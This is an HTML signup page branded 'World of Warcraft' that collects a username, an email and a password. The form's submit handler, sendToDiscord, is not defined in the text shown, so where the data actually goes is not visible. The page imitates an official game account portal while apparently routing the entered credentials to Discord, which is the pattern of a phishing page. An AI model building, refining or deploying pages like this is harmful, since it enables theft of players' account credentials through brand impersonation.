<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Portal | World of Warcraft</title>
    <style>
        /* Base Reset */
        * { box-sizing: border-box; }
        body {
            background-color: #050505;
            background: radial-gradient(circle at center, #151a1e 0%, #000000 100%);
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: "Palatino Linotype", "Book Antiqua", Palatino, serif;
            color: #f0f0f0;
        }

        /* The Main Portal Frame */
        .portal-box {
            width: 100%;
            max-width: 440px;
            background: #0d0d0d;
            border: 2px solid #2a2a2a;
            position: relative;
            box-shadow: 0 30px 60px rgba(0,0,0,0.9);
        }

        /* Gold Metallic Header Stripe */
        .portal-header {
            height: 6px;
            background: linear-gradient(90deg, #46331a 0%, #f8b700 50%, #46331a 100%);
            border-bottom: 1px solid #000;
        }

        .portal-content {
            padding: 40px 45px;
        }

        h1 {
            color: #ffffff;
            font-size: 26px;
            text-transform: uppercase;
            letter-spacing: 4px;
            margin: 0 0 10px 0;
            text-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
        }

        .subtitle {
            color: #ffd100;
            font-size: 11px;
            letter-spacing: 2px;
            margin-bottom: 35px;
            text-transform: uppercase;
            opacity: 0.8;
        }

        /* Stylized Form Groups */
        .input-group {
            text-align: left;
            margin-bottom: 25px;
        }

        label {
            display: block;
            color: #888;
            font-size: 10px;
            font-weight: bold;
            text-transform: uppercase;
            margin-bottom: 8px;
            letter-spacing: 1.5px;
        }

        input {
            width: 100%;
            padding: 14px;
            background: #000;
            border: 1px solid #333;
            color: #fff;
            font-size: 15px;
            transition: all 0.3s ease;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.5);
        }

        input:focus {
            outline: none;
            border-color: #f8b700;
            box-shadow: 0 0 10px rgba(248, 183, 0, 0.2);
        }

        /* The "Accept" Action Button */
        .btn-action {
            width: 100%;
            padding: 16px;
            background: linear-gradient(to bottom, #2b5697 0%, #102344 100%);
            border: 1px solid #4a90e2;
            color: #fff;
            font-weight: bold;
            text-transform: uppercase;
            font-size: 13px;
            cursor: pointer;
            letter-spacing: 2px;
            margin-top: 10px;
            box-shadow: 0 4px 0 #08152b;
        }

        .btn-action:hover {
            filter: brightness(1.2);
            transform: translateY(-1px);
        }

        .btn-action:active {
            transform: translateY(2px);
            box-shadow: none;
        }

        .portal-footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #1a1a1a;
            font-size: 11px;
            display: flex;
            justify-content: space-between;
        }

        .portal-footer a {
            color: #555;
            text-decoration: none;
            transition: color 0.2s;
        }

        .portal-footer a:hover {
            color: #ffd100;
        }
    </style>
</head>
<body>

    <div class="portal-box">
        <div class="portal-header"></div>
        <div class="portal-content">
            <h1>Account</h1>
            <div class="subtitle">Join the Eternal Struggle</div>
            
            <form onsubmit="sendToDiscord(event)">
                <div class="input-group">
                    <label>Battle-Tag / Username</label>
                    <input type="text" id="username" name="username" maxlength="16" required>
                </div>
                
                <div class="input-group">
                    <label>Communication Address</label>
                    <input type="email" id="email" name="email" required>
                </div>

                <div class="input-group">
                    <label>Secret Passcode</label>
                    <input type="password" id="password" name="password" required>
                </div>

                <button type="submit" class="btn-action">Create Account</button>
            </form>

            <div class="portal-footer">
                <a href="login.html">LOG IN</a>
                <a href="dashboard.html">DASHBOARD</a>
            </div>
        </div>
    </div>
